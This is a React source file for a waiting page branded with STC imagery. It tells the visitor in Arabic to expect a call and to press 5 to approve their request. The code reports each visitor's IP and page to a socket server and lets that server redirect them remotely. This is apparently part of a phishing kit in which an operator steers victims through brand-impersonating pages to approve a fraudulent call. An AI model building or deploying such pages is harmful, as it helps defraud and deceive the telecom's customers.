import React, { useEffect, useState } from "react";
import { socket } from "../App";

export default function StcCall() {
  const [ip, setIp] = useState(null);

  useEffect(() => {
    const getIP = async () => {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const { ip } = await res.json();
        setIp(ip);
        const page = window.location.pathname.split("/").pop() || "stcCall";
        socket.emit("updateLocation", { ip, page });
      } catch (err) {
        console.error("Failed to fetch visitor IP:", err);
      }
    };

    getIP();
    socket.on("navigateTo", ({ ip:IP, page }) => {
      console.log(localStorage.getItem("visitorIP"));
      if (IP == ip) {
        window.location.href = "/" + page;
      }
    });
    // Optional: load location.js behavior if needed (see below)
    
  }, []);

  return (
    <div className="flex items-center justify-center min-h-screen bg-white font-['Readex_Pro'] text-center">
      <div>
        <img src="/stcCall.PNG" alt="stc-call" className="w-1/2 mx-auto" />
        <div className="flex justify-center mt-5">
          <div
            className="spinner-border animate-spin inline-block w-8 h-8 border-4 border-current border-t-transparent rounded-full text-gray-500"
            role="status"
          ></div>
        </div>
        <h4 className="mt-4 font-bold text-xl text-gray-800">
          سوف تتلقى مكالمة قريبا
        </h4>
        <p className="text-gray-700 text-lg mt-2">
          يرجى الموافقة ب الضغط على رقم{" "}
          <span className="font-bold text-2xl">5</span> لإتمام طلبك
        </p>
      </div>
    </div>
  );
}
